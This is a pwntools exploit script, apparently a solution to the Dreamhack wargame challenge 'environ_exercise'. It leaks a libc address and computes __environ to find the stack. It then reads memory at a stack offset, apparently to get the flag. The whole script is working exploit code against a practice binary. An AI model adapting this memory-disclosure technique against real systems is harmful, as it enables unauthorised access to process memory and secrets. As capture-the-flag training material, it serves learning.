from pwn import *

p = remote("host1.dreamhack.games", 14758)
# p = process("./environ_exercise")
e = ELF("./environ_exercise")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
# lb = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.terminal = ["bash", "splitw", "-h"]
context.log_level = 'debug'

p.recvuntil(": ")
stdout_addr = int(p.recvn(14),16)
slog("stdout", stdout_addr)

libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
env_ptr = libc_base + libc.symbols["__environ"]

slog("env_ptr",env_ptr)

#rcx ~ env
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(env_ptr))

env_addr = u64(p.recvn(6)+"\x00"*2)
slog("env_addr", env_addr)

p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(env_addr-0x1538))

p.interactive()